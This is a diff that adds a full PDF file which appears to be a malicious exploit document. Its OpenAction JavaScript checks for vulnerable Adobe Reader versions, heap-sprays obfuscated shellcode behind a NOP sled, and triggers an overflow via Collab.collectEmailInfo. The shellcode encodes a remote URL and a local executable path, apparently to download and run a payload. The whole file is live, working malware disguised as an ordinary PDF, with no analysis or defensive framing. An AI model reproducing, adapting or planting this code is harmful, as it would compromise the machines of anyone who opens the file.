@@ -1,0 +1,126 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<</OpenAction <</JS (this.VXIi0FND\(\))
+/S /JavaScript
+>>
+/Threads 2 0 R
+/Outlines 3 0 R
+/Pages 4 0 R
+/ViewerPreferences <</PageDirection /L2R
+>>
+/PageLayout /SinglePage
+/AcroForm 5 0 R
+/Dests 6 0 R
+/Names 7 0 R
+/Type /Catalog
+>>
+endobj
+3 0 obj
+<</Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<</Resources 8 0 R
+/Kids [9 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+6 0 obj
+<<>>
+endobj
+5 0 obj
+<</Fields []
+>>
+endobj
+7 0 obj
+<</JavaScript 10 0 R
+>>
+endobj
+2 0 obj
+[]
+endobj
+11 0 obj
+<</Length 31
+>>
+stream
+0 0 595.28000 841.89000 re W n
+
+endstream
+endobj
+9 0 obj
+<</Rotate 0
+/Parent 4 0 R
+/Resources 8 0 R
+/TrimBox [0 0 595.28000 841.89000]
+/MediaBox [0 0 595.28000 841.89000]
+/pdftk_PageNum 1
+/Contents 11 0 R
+/Type /Page
+>>
+endobj
+8 0 obj
+<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+>>
+endobj
+12 0 obj
+<</Length 5592
+>>
+stream
+function VXIi0FND(){var RCWh3Mo = new Array();
+function pojn(T4Kt5, Epd2F0E){while (T4Kt5.length*2<Epd2F0E) {T4Kt5 += T4Kt5;}T4Kt5 = T4Kt5.substring(0,Epd2F0E/2);return T4Kt5;}
+function kSFAj5cr(){var mYwfRUoM = 0x0c0c0c0c;
+	var RRsuY = unescape("%u9"+""+"0"+"9"+"0%u9"+""+"0"+"90%u5"+""+"4"+"eb%u75"+"8b%u8b3c%u3"+"574%u0378%u56f5%u768b%u0320%u33"+"f5%u49c9%uad41%udb33%u0f36%u14be%u3828%u74f2%uc108%u0dcb%uda03%ueb40%u3bef%u75df%u5ee7%u5e8b%u0324%u66dd%u0c8b%u8b4b%u1c5e%udd03%u048b%u038b%uc3c5%u7275%u6d6c%u6e6f%u642e%u6c6c%u4300%u5c3a%u2e55%u7865%u0065%uc033%u0364%u3040%u0c78%u408b%u8b0c%u1c70%u8bad%u0840%u09eb%u408b%u8d34%u7c40%u408b%u953c%u8ebf%u0e4e%ue8ec%uff84%uffff%uec83%u8304%u242c%uff3c%u95d0%ubf50%u1a36%u702f%u6fe8%uffff%u8bff%u24"+"54%u8dfc%uba52%udb33%u5353%ueb52%u5324%ud0ff%ubf5d%ufe98%u0e8a%u53e8%uffff%u83ff%u04ec%u2c83%u6224%ud0ff%u7ebf%ue2d8%ue873%uff40%ufff"+"f%uff52%ue8d0%uffd7%uffff%u7468%u7074%u2f3a%u392f%u2e"+"31%u3032%u2e33%u3239%u312e%u3"+"833%u712f%u657"+"7%u6f2f%u7475%u70"+"2e%u7"+""+"0"+"6"+"8");
+	var ZvHDaEA = 0x400000;var ZkTp3dQH = RRsuY.length * 2;var Epd2F0E = ZvHDaEA - (ZkTp3dQH+0x38);var T4Kt5 = unescape("%u9"+"090%u9"+"090");T4Kt5 = pojn(T4Kt5, Epd2F0E);var NtQyWEl = (mYwfRUoM - 0x400000)/ZvHDaEA;for (var dzK0S=0;dzK0S<NtQyWEl;dzK0S++) {RCWh3Mo[dzK0S] = T4Kt5 + RRsuY;}}
+function N5YVdo(){var G6OhEfQ = app.viewerVersion.toString();G6OhEfQ = G6OhEfQ.replace(/\D/g,'');var n5u54Uq2Jm8B = new Array(G6OhEfQ.charAt(0),G6OhEfQ.charAt(1),G6OhEfQ.charAt(2));if ((n5u54Uq2Jm8B[0] == 8 && ((n5u54Uq2Jm8B[1] == 1 && n5u54Uq2Jm8B[2] < 2) || n5u54Uq2Jm8B[1] < 1)) ||(n5u54Uq2Jm8B[0] == 7 && n5u54Uq2Jm8B[1] < 1) ||(n5u54Uq2Jm8B[0] < 7)) {kSFAj5cr();var Vpf2Pb5T = unescape("%u0c0c%u0c0c");while(Vpf2Pb5T.length < 44952) Vpf2Pb5T += Vpf2Pb5T;this.collabStore = Collab.collectEmailInfo({subj: "",msg: Vpf2Pb5T});}}
+N5YVdo();
+}
+endstream
+endobj
+13 0 obj
+<</JS 12 0 R
+/S /JavaScript
+>>
+endobj
+10 0 obj
+<</Names [(VXIi0FND) 13 0 R]
+>>
+endobj
+14 0 obj
+<</Creator (Scribus 1.3.3.12)
+/Title <>
+/Producer (Scribus PDF Library 1.3.3.12)
+/Author <>
+/Keywords <>
+/Trapped /False
+/ModDate (D:20080806014227)
+/CreationDate (D:20080806014227)
+>>
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000470 00000 n 
+0000000262 00000 n 
+0000000307 00000 n 
+0000000400 00000 n 
+0000000380 00000 n 
+0000000431 00000 n 
+0000000747 00000 n 
+0000000569 00000 n 
+0000006504 00000 n 
+0000000488 00000 n 
+0000000813 00000 n 
+0000006457 00000 n 
+0000006554 00000 n 
+trailer
+<</Info 14 0 R
+/Root 1 0 R
+/Size 15
+>>
+startxref
+6755
+%%EOF
